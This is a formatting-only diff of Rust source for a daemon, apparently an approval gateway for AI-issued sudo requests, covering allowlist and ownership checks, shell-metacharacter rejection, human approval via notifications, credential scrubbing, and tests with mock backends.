@@ -10,10 +10,10 @@ use dashmap::DashMap;
 use std::os::unix::io::IntoRawFd;
 use std::path::Path;
 use std::sync::Arc;
+use std::sync::OnceLock;
 use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
 use tokio::net::UnixListener;
 use tokio::sync::oneshot;
-use std::sync::OnceLock;
 use tracing::{error, info, warn};
 
 use crate::bw_session::BwSessionManager;
@@ -22,19 +22,23 @@ use crate::bw_session::BwSessionManager;
 static DAEMON_START: OnceLock<std::time::Instant> = OnceLock::new();
 use crate::config::{BinaryOwnershipCheck, ConfigHolder, LimitsConfig, RateLimitMode};
 use crate::db::Database;
-use crate::notification::{BwConfirmRecord, BwRequestRecord, CompletionInfo, NotificationBackend, TempRuleRecord};
+use crate::notification::{
+    BwConfirmRecord, BwRequestRecord, CompletionInfo, NotificationBackend, TempRuleRecord,
+};
 use crate::sudoers::SudoersCache;
 
 /// Interpreter basenames whose script argument must also pass ownership checks.
 /// When a command starts with one of these, the next non-flag argument is treated
 /// as a script path and validated with the same ownership/writability rules.
-const INTERPRETER_NAMES: &[&str] = &[
-    "bash", "sh", "python", "python3", "perl", "ruby", "node",
-];
+const INTERPRETER_NAMES: &[&str] = &["bash", "sh", "python", "python3", "perl", "ruby", "node"];
 
 /// Check that a file path is owned by a trusted user and not writable by
 /// untrusted users. Returns Ok(()) on success, Err(message) on rejection.
-fn check_path_ownership(path: &std::path::Path, label: &str, limits: &LimitsConfig) -> std::result::Result<(), String> {
+fn check_path_ownership(
+    path: &std::path::Path,
+    label: &str,
+    limits: &LimitsConfig,
+) -> std::result::Result<(), String> {
     use std::os::unix::fs::MetadataExt;
 
     // Follow symlinks and stat the target
@@ -120,8 +124,8 @@ fn check_binary_ownership(command: &str, limits: &LimitsConfig) -> std::result::
     // Skip flags (tokens starting with '-') to find the script path.
     if is_interpreter(binary) || is_interpreter(path.to_str().unwrap_or("")) {
         let mut tokens = command.split_whitespace().skip(1); // skip the interpreter
-        // Find the first non-flag argument (the script path).
-        // Stop at "-c" since that's an inline command, not a file.
+                                                             // Find the first non-flag argument (the script path).
+                                                             // Stop at "-c" since that's an inline command, not a file.
         let script_arg = loop {
             match tokens.next() {
                 Some("-c") => break None, // inline command, not a file — skip
@@ -146,7 +150,10 @@ fn check_binary_ownership(command: &str, limits: &LimitsConfig) -> std::result::
 
 /// Check ownership of all binaries in a command chain.
 /// Parses the command into chain segments and validates each one.
-fn check_command_chain_ownership(command: &str, limits: &LimitsConfig) -> std::result::Result<(), String> {
+fn check_command_chain_ownership(
+    command: &str,
+    limits: &LimitsConfig,
+) -> std::result::Result<(), String> {
     if limits.check_binary_ownership == BinaryOwnershipCheck::Off {
         return Ok(());
     }
@@ -169,7 +176,11 @@ fn check_command_chain_ownership(command: &str, limits: &LimitsConfig) -> std::r
 /// Check ownership of the original command AND the inner (stripped) command when
 /// strip_shell_prefix is enabled. This ensures both the wrapper binary (e.g. bash)
 /// and the inner command binary (e.g. systemctl) are validated.
-fn check_ownership_with_strip(command: &str, match_command: &str, limits: &LimitsConfig) -> std::result::Result<(), String> {
+fn check_ownership_with_strip(
+    command: &str,
+    match_command: &str,
+    limits: &LimitsConfig,
+) -> std::result::Result<(), String> {
     // Always check the original command (covers the wrapper binary like bash/sh)
     check_command_chain_ownership(command, limits)?;
     // If stripping produced a different command, also check the inner command's binaries
@@ -300,7 +311,11 @@ fn parse_command_chain(input: &str) -> Result<Vec<ChainSegment>, String> {
 
         // --- Outside quotes: check for rejected metacharacters ---
         match c {
-            '$' => return Err("rejected: unquoted '$' (variable expansion/command substitution)".to_string()),
+            '$' => {
+                return Err(
+                    "rejected: unquoted '$' (variable expansion/command substitution)".to_string(),
+                )
+            }
             '`' => return Err("rejected: unquoted '`' (backtick command substitution)".to_string()),
             '(' => return Err("rejected: unquoted '(' (subshell/grouping)".to_string()),
             ')' => return Err("rejected: unquoted ')' (subshell/grouping)".to_string()),
@@ -318,7 +333,10 @@ fn parse_command_chain(input: &str) -> Result<Vec<ChainSegment>, String> {
                 if cmd.is_empty() {
                     return Err("empty command before '&&'".to_string());
                 }
-                segments.push(ChainSegment { command: cmd, op: current_op });
+                segments.push(ChainSegment {
+                    command: cmd,
+                    op: current_op,
+                });
                 current_op = ChainOp::And;
                 current.clear();
                 i += 2;
@@ -336,7 +354,10 @@ fn parse_command_chain(input: &str) -> Result<Vec<ChainSegment>, String> {
                 if cmd.is_empty() {
                     return Err("empty command before '||'".to_string());
                 }
-                segments.push(ChainSegment { command: cmd, op: current_op });
+                segments.push(ChainSegment {
+                    command: cmd,
+                    op: current_op,
+                });
                 current_op = ChainOp::Or;
                 current.clear();
                 i += 2;
@@ -347,7 +368,10 @@ fn parse_command_chain(input: &str) -> Result<Vec<ChainSegment>, String> {
                 if cmd.is_empty() {
                     return Err("empty command before '|'".to_string());
                 }
-                segments.push(ChainSegment { command: cmd, op: current_op });
+                segments.push(ChainSegment {
+                    command: cmd,
+                    op: current_op,
+                });
                 current_op = ChainOp::Pipe;
                 current.clear();
                 i += 1;
@@ -360,7 +384,10 @@ fn parse_command_chain(input: &str) -> Result<Vec<ChainSegment>, String> {
             if cmd.is_empty() {
                 return Err("empty command before ';'".to_string());
             }
-            segments.push(ChainSegment { command: cmd, op: current_op });
+            segments.push(ChainSegment {
+                command: cmd,
+                op: current_op,
+            });
             current_op = ChainOp::Semi;
             current.clear();
             i += 1;
@@ -385,15 +412,21 @@ fn parse_command_chain(input: &str) -> Result<Vec<ChainSegment>, String> {
         if segments.is_empty() {
             return Err("empty command".to_string());
         }
-        return Err(format!("empty command after '{}'", match current_op {
-            ChainOp::Semi => ";",
-            ChainOp::And => "&&",
-            ChainOp::Or => "||",
-            ChainOp::Pipe => "|",
-            ChainOp::First => "",
-        }));
+        return Err(format!(
+            "empty command after '{}'",
+            match current_op {
+                ChainOp::Semi => ";",
+                ChainOp::And => "&&",
+                ChainOp::Or => "||",
+                ChainOp::Pipe => "|",
+                ChainOp::First => "",
+            }
+        ));
     }
-    segments.push(ChainSegment { command: cmd, op: current_op });
+    segments.push(ChainSegment {
+        command: cmd,
+        op: current_op,
+    });
 
     Ok(segments)
 }
@@ -404,7 +437,9 @@ fn is_single_command_allowed(command: &str, allowlist: &[String]) -> bool {
         if command == pattern {
             return true;
         }
-        if command.starts_with(pattern.as_str()) && command.as_bytes().get(pattern.len()) == Some(&b' ') {
+        if command.starts_with(pattern.as_str())
+            && command.as_bytes().get(pattern.len()) == Some(&b' ')
+        {
             return true;
         }
     }
@@ -486,8 +521,19 @@ pub async fn run_socket_listener(
                 });
 
                 tokio::spawn(async move {
-                    if let Err(e) =
-                        handle_connection(stream, db, backend, sudoers, timeout, &allowlist, &denylist, &allowlist_per_user, limits, bw_ctx).await
+                    if let Err(e) = handle_connection(
+                        stream,
+                        db,
+                        backend,
+                        sudoers,
+                        timeout,
+                        &allowlist,
+                        &denylist,
+                        &allowlist_per_user,
+                        limits,
+                        bw_ctx,
+                    )
+                    .await
                     {
                         error!("Connection handler error: {e:#}");
                     }
@@ -522,10 +568,7 @@ async fn handle_connection(
 ) -> Result<()> {
     // Extract the real UID of the connecting process via SO_PEERCRED.
     // This cannot be spoofed by the client (kernel-provided).
-    let peer_uid = stream
-        .peer_cred()
-        .ok()
-        .map(|cred| cred.uid());
+    let peer_uid = stream.peer_cred().ok().map(|cred| cred.uid());
 
     let (reader, mut writer) = stream.into_split();
 
@@ -559,11 +602,30 @@ async fn handle_connection(
         match msg {
             SocketMessage::SudoRequest(mut request) => {
                 override_user_from_peer(&mut request.user, peer_uid);
-                handle_sudo_request(request, &mut writer, db, backend, sudoers, timeout_seconds, allowlist, denylist, allowlist_per_user, &limits).await
+                handle_sudo_request(
+                    request,
+                    &mut writer,
+                    db,
+                    backend,
+                    sudoers,
+                    timeout_seconds,
+                    allowlist,
+                    denylist,
+                    allowlist_per_user,
+                    &limits,
+                )
+                .await
             }
             SocketMessage::TempRuleRequest(mut request) => {
                 override_user_from_peer(&mut request.user, peer_uid);
-                handle_temp_rule_request(request, &mut writer, db, backend, limits.max_temp_rule_duration_seconds).await
+                handle_temp_rule_request(
+                    request,
+                    &mut writer,
+                    db,
+                    backend,
+                    limits.max_temp_rule_duration_seconds,
+                )
+                .await
             }
             SocketMessage::ListRules(mut request) => {
                 override_user_from_peer(&mut request.user, peer_uid);
@@ -636,7 +698,19 @@ async fn handle_connection(
         match serde_json::from_str::<SudoRequest>(&line) {
             Ok(mut request) => {
                 override_user_from_peer(&mut request.user, peer_uid);
-                handle_sudo_request(request, &mut writer, db, backend, sudoers, timeout_seconds, allowlist, denylist, allowlist_per_user, &limits).await
+                handle_sudo_request(
+                    request,
+                    &mut writer,
+                    db,
+                    backend,
+                    sudoers,
+                    timeout_seconds,
+                    allowlist,
+                    denylist,
+                    allowlist_per_user,
+                    &limits,
+                )
+                .await
             }
             Err(_e) => Err(anyhow::anyhow!("invalid request")),
         }
@@ -780,23 +854,29 @@ async fn handle_sudo_request(
     }
 
     // Build effective allowlist: global + per-user (if any)
-    let effective_allowlist: Vec<String> = if let Some(user_allowlist) = allowlist_per_user.get(&user) {
-        let mut combined = allowlist.to_vec();
-        combined.extend(user_allowlist.clone());
-        combined
-    } else {
-        allowlist.to_vec()
-    };
+    let effective_allowlist: Vec<String> =
+        if let Some(user_allowlist) = allowlist_per_user.get(&user) {
+            let mut combined = allowlist.to_vec();
+            combined.extend(user_allowlist.clone());
+            combined
+        } else {
+            allowlist.to_vec()
+        };
 
     // Check allowlist - auto-approved commands skip rate limiting
     if is_allowed_with_strip(&command, &effective_allowlist, limits.strip_shell_prefix) {
         // Validate binary ownership before auto-executing
         if let Err(reason) = check_ownership_with_strip(&command, &match_command, &limits) {
-            deny_ownership(writer, String::new(), &format!("Allowlisted command rejected (ownership): {reason}")).await?;
+            deny_ownership(
+                writer,
+                String::new(),
+                &format!("Allowlisted command rejected (ownership): {reason}"),
+            )
+            .await?;
             return Ok(());
         }
         info!("Command auto-approved via allowlist: {}", command);
-        
+
         // For dry-run, just return approved without executing or logging
         if dry_run {
             let response = SudoResponse {
@@ -810,7 +890,7 @@ async fn handle_sudo_request(
             writer.flush().await?;
             return Ok(());
         }
-        
+
         let record = SudoRequestRecord::new(request, effective_timeout);
         db.insert_request(&record)?;
         db.update_decision(&record.id, Decision::Approved, "allowlist")?;
@@ -833,11 +913,16 @@ async fn handle_sudo_request(
     if is_temp_rule_allowed_with_strip(&db, &request.user, &command, limits.strip_shell_prefix)? {
         // Validate binary ownership before auto-executing
         if let Err(reason) = check_ownership_with_strip(&command, &match_command, &limits) {
-            deny_ownership(writer, String::new(), &format!("Temp-rule command rejected (ownership): {reason}")).await?;
+            deny_ownership(
+                writer,
+                String::new(),
+                &format!("Temp-rule command rejected (ownership): {reason}"),
+            )
+            .await?;
             return Ok(());
         }
         info!("Command auto-approved via temp rule: {}", command);
-        
+
         // For dry-run, just return approved without executing or logging
         if dry_run {
             let response = SudoResponse {
@@ -851,7 +936,7 @@ async fn handle_sudo_request(
             writer.flush().await?;
             return Ok(());
         }
-        
+
         let record = SudoRequestRecord::new(request.clone(), effective_timeout);
         db.insert_request(&record)?;
         db.update_decision(&record.id, Decision::Approved, "temp_rule")?;
@@ -875,14 +960,16 @@ async fn handle_sudo_request(
         let user = request.user.clone();
         let cmd = command.clone();
         let sudoers_ref = Arc::clone(&sudoers);
-        let is_nopasswd = tokio::task::spawn_blocking(move || {
-            sudoers_ref.is_nopasswd_allowed(&user, &cmd)
-        })
-        .await?;
+        let is_nopasswd =
+            tokio::task::spawn_blocking(move || sudoers_ref.is_nopasswd_allowed(&user, &cmd))
+                .await?;
 
         if is_nopasswd {
-            info!("Command matches NOPASSWD rule, telling CLI to use sudo: {}", command);
-            
+            info!(
+                "Command matches NOPASSWD rule, telling CLI to use sudo: {}",
+                command
+            );
+
             // For dry-run, just return UseSudo without logging
             if dry_run {
                 let response = SudoResponse {
@@ -896,7 +983,7 @@ async fn handle_sudo_request(
                 writer.flush().await?;
                 return Ok(());
             }
-            
+
             let record = SudoRequestRecord::new(request.clone(), effective_timeout);
             db.insert_request(&record)?;
             db.update_decision(&record.id, Decision::UseSudo, "nopasswd")?;
@@ -953,7 +1040,11 @@ async fn handle_sudo_request(
         limits.rate_limit_window_seconds,
         global_rate_limit,
     )? {
-        let limit_type = if global_rate_limit { "global" } else { "per-user" };
+        let limit_type = if global_rate_limit {
+            "global"
+        } else {
+            "per-user"
+        };
         warn!(
             "Rate limit exceeded ({}): user={} limit={} window={}s",
             limit_type, request.user, limits.rate_limit_requests, limits.rate_limit_window_seconds
@@ -974,14 +1065,17 @@ async fn handle_sudo_request(
     let (decision, error_msg) = match backend.send_and_wait(&record).await {
         Ok(d) => (d, None),
         Err(e) => {
-            error!("Notification backend error for request {}: {e:#}", record.id);
+            error!(
+                "Notification backend error for request {}: {e:#}",
+                record.id
+            );
             (Decision::Denied, Some("notification error".to_string()))
         }
     };
 
     // Update database
     db.update_decision(&record.id, decision, backend.name())?;
-    
+
     let request_id = record.id.clone();
 
     // Send response
@@ -999,22 +1093,29 @@ async fn handle_sudo_request(
         // If check_binary_ownership is "all", validate even human-approved commands
         if limits.check_binary_ownership == BinaryOwnershipCheck::All {
             if let Err(reason) = check_ownership_with_strip(&command, &match_command, &limits) {
-                deny_ownership(writer, request_id.clone(), &format!("Human-approved command rejected (ownership): {reason}")).await?;
+                deny_ownership(
+                    writer,
+                    request_id.clone(),
+                    &format!("Human-approved command rejected (ownership): {reason}"),
+                )
+                .await?;
                 return Ok(());
             }
         }
         let exec_result = exec_command(&command, &cwd, stdin_bytes, writer, true, &user).await?;
-        
+
         // Update Telegram notification with completion status
-        backend.update_completion_status(&CompletionInfo {
-            request_id,
-            exit_code: exec_result.exit_code,
-            last_lines: if exec_result.exit_code != 0 {
-                exec_result.last_lines
-            } else {
-                None
-            },
-        }).await;
+        backend
+            .update_completion_status(&CompletionInfo {
+                request_id,
+                exit_code: exec_result.exit_code,
+                last_lines: if exec_result.exit_code != 0 {
+                    exec_result.last_lines
+                } else {
+                    None
+                },
+            })
+            .await;
     }
 
     Ok(())
@@ -1033,7 +1134,9 @@ fn is_temp_rule_allowed(db: &Database, user: &str, command: &str) -> Result<bool
         all_rules.push(patterns);
     }
     // Every sub-command must match at least one temp rule pattern.
-    Ok(segments.iter().all(|seg| is_single_command_temp_rule_allowed(&seg.command, &all_rules)))
+    Ok(segments
+        .iter()
+        .all(|seg| is_single_command_temp_rule_allowed(&seg.command, &all_rules)))
 }
 
 async fn handle_temp_rule_request(
@@ -1084,7 +1187,8 @@ async fn handle_temp_rule_request(
     let nonce = uuid::Uuid::new_v4().to_string();
     let now = chrono::Utc::now();
     let requested_at = now.to_rfc3339();
-    let expires_at = (now + chrono::Duration::seconds(request.duration_seconds as i64)).to_rfc3339();
+    let expires_at =
+        (now + chrono::Duration::seconds(request.duration_seconds as i64)).to_rfc3339();
     let patterns_json = serde_json::to_string(&request.patterns)?;
 
     db.insert_temp_rule(
@@ -1163,10 +1267,8 @@ async fn handle_list_rules(
     // Gather NOPASSWD rules via spawn_blocking
     let sudoers_ref = Arc::clone(&sudoers);
     let user_clone = user.clone();
-    let nopasswd_rules = tokio::task::spawn_blocking(move || {
-        sudoers_ref.get_nopasswd_rules(&user_clone)
-    })
-    .await?;
+    let nopasswd_rules =
+        tokio::task::spawn_blocking(move || sudoers_ref.get_nopasswd_rules(&user_clone)).await?;
 
     let response = ListRulesResponse {
         allowlist: allowlist.to_vec(),
@@ -1516,9 +1618,8 @@ async fn handle_bw_get(
     writer.flush().await?;
 
     // Schedule scrub
-    let scrub_at = (chrono::Utc::now()
-        + chrono::Duration::seconds(bw_ctx.scrub_delay as i64))
-    .to_rfc3339();
+    let scrub_at =
+        (chrono::Utc::now() + chrono::Duration::seconds(bw_ctx.scrub_delay as i64)).to_rfc3339();
 
     // Extend existing scrub timer if same credential, otherwise create new entry
     if !db.extend_scrub_timer(&hash, &scrub_at)? {
@@ -1528,7 +1629,14 @@ async fn handle_bw_get(
             .map(|p| p.to_string_lossy().to_string())
             .collect();
         let scrub_id = uuid::Uuid::new_v4().to_string();
-        db.insert_scrub_entry(&scrub_id, &id, &hash, &field_value, &scrub_at, &file_strings)?;
+        db.insert_scrub_entry(
+            &scrub_id,
+            &id,
+            &hash,
+            &field_value,
+            &scrub_at,
+            &file_strings,
+        )?;
     }
 
     info!(
@@ -1627,8 +1735,8 @@ async fn exec_command(
     use_shell: bool,
     sudo_user: &str,
 ) -> Result<ExecResult> {
-    use tokio::process::Command;
     use std::collections::VecDeque;
+    use tokio::process::Command;
 
     const MAX_LAST_LINES: usize = 5;
     let mut output_lines: VecDeque<String> = VecDeque::with_capacity(MAX_LAST_LINES);
@@ -1641,7 +1749,9 @@ async fn exec_command(
         c
     } else {
         let mut parts = command.split_whitespace();
-        let binary = parts.next().ok_or_else(|| anyhow::anyhow!("empty command"))?;
+        let binary = parts
+            .next()
+            .ok_or_else(|| anyhow::anyhow!("empty command"))?;
         let mut c = Command::new(binary);
         c.args(parts);
         c
@@ -1739,7 +1849,7 @@ async fn exec_command(
             }
             output_lines.push_back(line.to_string());
         }
-        
+
         let json = serde_json::to_string(&output)?;
         if writer.write_all(json.as_bytes()).await.is_err()
             || writer.write_all(b"\n").await.is_err()
@@ -1775,7 +1885,10 @@ async fn exec_command(
         Some(output_lines.into_iter().collect::<Vec<_>>().join("\n"))
     };
 
-    Ok(ExecResult { exit_code, last_lines })
+    Ok(ExecResult {
+        exit_code,
+        last_lines,
+    })
 }
 
 /// Split a single command string into argv, respecting single and double quotes.
@@ -1906,7 +2019,8 @@ async fn exec_command_chain(
                 if i == 0 { stdin_bytes.clone() } else { None },
                 writer,
                 sudo_user,
-            ).await?;
+            )
+            .await?;
         } else {
             // Pipeline: connect stdout→stdin between stages
             last_exit_code = exec_pipeline(
@@ -1915,7 +2029,8 @@ async fn exec_command_chain(
                 if i == 0 { stdin_bytes.clone() } else { None },
                 writer,
                 sudo_user,
-            ).await?;
+            )
+            .await?;
         }
 
         i = pipe_end;
@@ -2118,11 +2233,13 @@ async fn stream_child_output(
                     Ok(0) => break,
                     Ok(n) => {
                         let data = String::from_utf8_lossy(&buf[..n]).to_string();
-                        let _ = tx_out.send(ExecOutput {
-                            stream: "stdout".to_string(),
-                            data,
-                            exit_code: None,
-                        }).await;
+                        let _ = tx_out
+                            .send(ExecOutput {
+                                stream: "stdout".to_string(),
+                                data,
+                                exit_code: None,
+                            })
+                            .await;
                     }
                     Err(_) => break,
                 }
@@ -2141,11 +2258,13 @@ async fn stream_child_output(
                     Ok(0) => break,
                     Ok(n) => {
                         let data = String::from_utf8_lossy(&buf[..n]).to_string();
-                        let _ = tx_err.send(ExecOutput {
-                            stream: "stderr".to_string(),
-                            data,
-                            exit_code: None,
-                        }).await;
+                        let _ = tx_err
+                            .send(ExecOutput {
+                                stream: "stderr".to_string(),
+                                data,
+                                exit_code: None,
+                            })
+                            .await;
                     }
                     Err(_) => break,
                 }
@@ -2180,13 +2299,19 @@ fn is_allowed(command: &str, allowlist: &[String]) -> bool {
         Err(_) => return false,
     };
     // Every sub-command must match the allowlist.
-    segments.iter().all(|seg| is_single_command_allowed(&seg.command, allowlist))
+    segments
+        .iter()
+        .all(|seg| is_single_command_allowed(&seg.command, allowlist))
 }
 
 /// Shell names (bare and absolute paths) recognized as wrappers.
 const SHELL_NAMES: &[&str] = &[
-    "/usr/bin/bash", "/bin/bash", "/usr/bin/sh", "/bin/sh",
-    "bash", "sh",
+    "/usr/bin/bash",
+    "/bin/bash",
+    "/usr/bin/sh",
+    "/bin/sh",
+    "bash",
+    "sh",
 ];
 
 /// Try to strip one shell-wrapper layer from a command.
@@ -2202,7 +2327,10 @@ fn strip_one_shell_layer(input: &str) -> Option<String> {
     let trimmed = input.trim();
 
     // Handle `env ` prefix: strip it so `env bash -c '...'` is treated like `bash -c '...'`
-    let after_env = trimmed.strip_prefix("env ").map(|s| s.trim_start()).unwrap_or(trimmed);
+    let after_env = trimmed
+        .strip_prefix("env ")
+        .map(|s| s.trim_start())
+        .unwrap_or(trimmed);
 
     for shell in SHELL_NAMES {
         // ---- shell -c ... ----
@@ -2372,22 +2500,38 @@ mod tests {
         async fn send_and_wait(&self, _record: &SudoRequestRecord) -> anyhow::Result<Decision> {
             panic!("send_and_wait should not be called when rate-limited");
         }
-        async fn send_temp_rule_and_wait(&self, _record: &crate::notification::TempRuleRecord) -> anyhow::Result<Decision> {
+        async fn send_temp_rule_and_wait(
+            &self,
+            _record: &crate::notification::TempRuleRecord,
+        ) -> anyhow::Result<Decision> {
             panic!("send_temp_rule_and_wait should not be called");
         }
-        async fn send_bw_request_and_wait(&self, _record: &crate::notification::BwRequestRecord) -> anyhow::Result<Decision> {
+        async fn send_bw_request_and_wait(
+            &self,
+            _record: &crate::notification::BwRequestRecord,
+        ) -> anyhow::Result<Decision> {
             panic!("send_bw_request_and_wait should not be called");
         }
-        async fn send_bw_confirm_and_wait(&self, _record: &crate::notification::BwConfirmRecord) -> anyhow::Result<Decision> {
+        async fn send_bw_confirm_and_wait(
+            &self,
+            _record: &crate::notification::BwConfirmRecord,
+        ) -> anyhow::Result<Decision> {
             panic!("send_bw_confirm_and_wait should not be called");
         }
-        async fn send_bw_locked_notification(&self, _record: &crate::notification::BwRequestRecord) -> anyhow::Result<()> {
+        async fn send_bw_locked_notification(
+            &self,
+            _record: &crate::notification::BwRequestRecord,
+        ) -> anyhow::Result<()> {
             Ok(())
         }
         async fn send_access_link(&self, _url: &str) -> anyhow::Result<()> {
             Ok(())
         }
-        async fn send_scrub_complete(&self, _request_id: &str, _item_name: &str) -> anyhow::Result<()> {
+        async fn send_scrub_complete(
+            &self,
+            _request_id: &str,
+            _item_name: &str,
+        ) -> anyhow::Result<()> {
             Ok(())
         }
         async fn update_completion_status(&self, _info: &crate::notification::CompletionInfo) {}
@@ -2398,10 +2542,8 @@ mod tests {
 
     #[tokio::test]
     async fn rate_limit_sends_denial_response() {
-        let dir = std::env::temp_dir().join(format!(
-            "aisudo-rate-limit-test-{}",
-            std::process::id()
-        ));
+        let dir =
+            std::env::temp_dir().join(format!("aisudo-rate-limit-test-{}", std::process::id()));
         std::fs::create_dir_all(&dir).unwrap();
         let db = Arc::new(crate::db::Database::open(&dir.join("test.db")).unwrap());
 
@@ -2419,8 +2561,8 @@ mod tests {
                 reason: None,
                 stdin: None,
                 skip_nopasswd: false,
-        timeout_seconds: None,
-        dry_run: false,
+                timeout_seconds: None,
+                dry_run: false,
             };
             let record = SudoRequestRecord::new(req, 60);
             db.insert_request(&record).unwrap();
@@ -2447,7 +2589,19 @@ mod tests {
             history_retention_days: 365,
         };
         let handler = tokio::spawn(async move {
-            handle_connection(server, db_clone, backend, sudoers, 60, &[], &[], &std::collections::HashMap::new(), limits, None).await
+            handle_connection(
+                server,
+                db_clone,
+                backend,
+                sudoers,
+                60,
+                &[],
+                &[],
+                &std::collections::HashMap::new(),
+                limits,
+                None,
+            )
+            .await
         });
 
         // Client side: send a request that should be rate-limited
@@ -2461,8 +2615,8 @@ mod tests {
             reason: None,
             stdin: None,
             skip_nopasswd: false,
-        timeout_seconds: None,
-        dry_run: false,
+            timeout_seconds: None,
+            dry_run: false,
         };
         let json = serde_json::to_string(&request).unwrap();
         writer.write_all(json.as_bytes()).await.unwrap();
@@ -2488,11 +2642,7 @@ mod tests {
         let response: SudoResponse = serde_json::from_str(line.trim()).unwrap();
         assert_eq!(response.decision, Decision::Denied);
         assert!(
-            response
-                .error
-                .as_deref()
-                .unwrap()
-                .contains("rate limit"),
+            response.error.as_deref().unwrap().contains("rate limit"),
             "expected 'rate limit' in error, got: {:?}",
             response.error
         );
@@ -2511,22 +2661,38 @@ mod tests {
         async fn send_and_wait(&self, _record: &SudoRequestRecord) -> anyhow::Result<Decision> {
             Ok(Decision::Approved)
         }
-        async fn send_temp_rule_and_wait(&self, _record: &crate::notification::TempRuleRecord) -> anyhow::Result<Decision> {
+        async fn send_temp_rule_and_wait(
+            &self,
+            _record: &crate::notification::TempRuleRecord,
+        ) -> anyhow::Result<Decision> {
             Ok(Decision::Approved)
         }
-        async fn send_bw_request_and_wait(&self, _record: &crate::notification::BwRequestRecord) -> anyhow::Result<Decision> {
+        async fn send_bw_request_and_wait(
+            &self,
+            _record: &crate::notification::BwRequestRecord,
+        ) -> anyhow::Result<Decision> {
             Ok(Decision::Approved)
         }
-        async fn send_bw_confirm_and_wait(&self, _record: &crate::notification::BwConfirmRecord) -> anyhow::Result<Decision> {
+        async fn send_bw_confirm_and_wait(
+            &self,
+            _record: &crate::notification::BwConfirmRecord,
+        ) -> anyhow::Result<Decision> {
             Ok(Decision::Approved)
         }
-        async fn send_bw_locked_notification(&self, _record: &crate::notification::BwRequestRecord) -> anyhow::Result<()> {
+        async fn send_bw_locked_notification(
+            &self,
+            _record: &crate::notification::BwRequestRecord,
+        ) -> anyhow::Result<()> {
             Ok(())
         }
         async fn send_access_link(&self, _url: &str) -> anyhow::Result<()> {
             Ok(())
         }
-        async fn send_scrub_complete(&self, _request_id: &str, _item_name: &str) -> anyhow::Result<()> {
+        async fn send_scrub_complete(
+            &self,
+            _request_id: &str,
+            _item_name: &str,
+        ) -> anyhow::Result<()> {
             Ok(())
         }
         async fn update_completion_status(&self, _info: &crate::notification::CompletionInfo) {}
@@ -2542,22 +2708,38 @@ mod tests {
         async fn send_and_wait(&self, _record: &SudoRequestRecord) -> anyhow::Result<Decision> {
             Ok(Decision::Denied)
         }
-        async fn send_temp_rule_and_wait(&self, _record: &crate::notification::TempRuleRecord) -> anyhow::Result<Decision> {
+        async fn send_temp_rule_and_wait(
+            &self,
+            _record: &crate::notification::TempRuleRecord,
+        ) -> anyhow::Result<Decision> {
             Ok(Decision::Denied)
         }
-        async fn send_bw_request_and_wait(&self, _record: &crate::notification::BwRequestRecord) -> anyhow::Result<Decision> {
+        async fn send_bw_request_and_wait(
+            &self,
+            _record: &crate::notification::BwRequestRecord,
+        ) -> anyhow::Result<Decision> {
             Ok(Decision::Denied)
         }
-        async fn send_bw_confirm_and_wait(&self, _record: &crate::notification::BwConfirmRecord) -> anyhow::Result<Decision> {
+        async fn send_bw_confirm_and_wait(
+            &self,
+            _record: &crate::notification::BwConfirmRecord,
+        ) -> anyhow::Result<Decision> {
             Ok(Decision::Denied)
         }
-        async fn send_bw_locked_notification(&self, _record: &crate::notification::BwRequestRecord) -> anyhow::Result<()> {
+        async fn send_bw_locked_notification(
+            &self,
+            _record: &crate::notification::BwRequestRecord,
+        ) -> anyhow::Result<()> {
             Ok(())
         }
         async fn send_access_link(&self, _url: &str) -> anyhow::Result<()> {
             Ok(())
         }
-        async fn send_scrub_complete(&self, _request_id: &str, _item_name: &str) -> anyhow::Result<()> {
+        async fn send_scrub_complete(
+            &self,
+            _request_id: &str,
+            _item_name: &str,
+        ) -> anyhow::Result<()> {
             Ok(())
         }
         async fn update_completion_status(&self, _info: &crate::notification::CompletionInfo) {}
@@ -2573,22 +2755,38 @@ mod tests {
         async fn send_and_wait(&self, _record: &SudoRequestRecord) -> anyhow::Result<Decision> {
             Err(anyhow::anyhow!("notification service down"))
         }
-        async fn send_temp_rule_and_wait(&self, _record: &crate::notification::TempRuleRecord) -> anyhow::Result<Decision> {
+        async fn send_temp_rule_and_wait(
+            &self,
+            _record: &crate::notification::TempRuleRecord,
+        ) -> anyhow::Result<Decision> {
             Err(anyhow::anyhow!("notification service down"))
         }
-        async fn send_bw_request_and_wait(&self, _record: &crate::notification::BwRequestRecord) -> anyhow::Result<Decision> {
+        async fn send_bw_request_and_wait(
+            &self,
+            _record: &crate::notification::BwRequestRecord,
+        ) -> anyhow::Result<Decision> {
             Err(anyhow::anyhow!("notification service down"))
         }
-        async fn send_bw_confirm_and_wait(&self, _record: &crate::notification::BwConfirmRecord) -> anyhow::Result<Decision> {
+        async fn send_bw_confirm_and_wait(
+            &self,
+            _record: &crate::notification::BwConfirmRecord,
+        ) -> anyhow::Result<Decision> {
             Err(anyhow::anyhow!("notification service down"))
         }
-        async fn send_bw_locked_notification(&self, _record: &crate::notification::BwRequestRecord) -> anyhow::Result<()> {
+        async fn send_bw_locked_notification(
+            &self,
+            _record: &crate::notification::BwRequestRecord,
+        ) -> anyhow::Result<()> {
             Ok(())
         }
         async fn send_access_link(&self, _url: &str) -> anyhow::Result<()> {
             Ok(())
         }
-        async fn send_scrub_complete(&self, _request_id: &str, _item_name: &str) -> anyhow::Result<()> {
+        async fn send_scrub_complete(
+            &self,
+            _request_id: &str,
+            _item_name: &str,
+        ) -> anyhow::Result<()> {
             Ok(())
         }
         async fn update_completion_status(&self, _info: &crate::notification::CompletionInfo) {}
@@ -2646,7 +2844,19 @@ mod tests {
         let denylist = denylist.to_vec();
         let allowlist_per_user = allowlist_per_user.clone();
         let handler = tokio::spawn(async move {
-            handle_connection(server, db2, backend2, sudoers, 60, &allowlist, &denylist, &allowlist_per_user, limits, None).await
+            handle_connection(
+                server,
+                db2,
+                backend2,
+                sudoers,
+                60,
+                &allowlist,
+                &denylist,
+                &allowlist_per_user,
+                limits,
+                None,
+            )
+            .await
         });
 
         let (reader, mut writer) = client.into_split();
@@ -2690,9 +2900,15 @@ mod tests {
         let json = serde_json::to_string(&request).unwrap();
 
         let resp_line = send_and_receive(
-            db, backend, &json,
-            &["apt list".to_string()], &[], &std::collections::HashMap::new(), test_limits(),
-        ).await;
+            db,
+            backend,
+            &json,
+            &["apt list".to_string()],
+            &[],
+            &std::collections::HashMap::new(),
+            test_limits(),
+        )
+        .await;
 
         let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
         assert_eq!(response.decision, Decision::Approved);
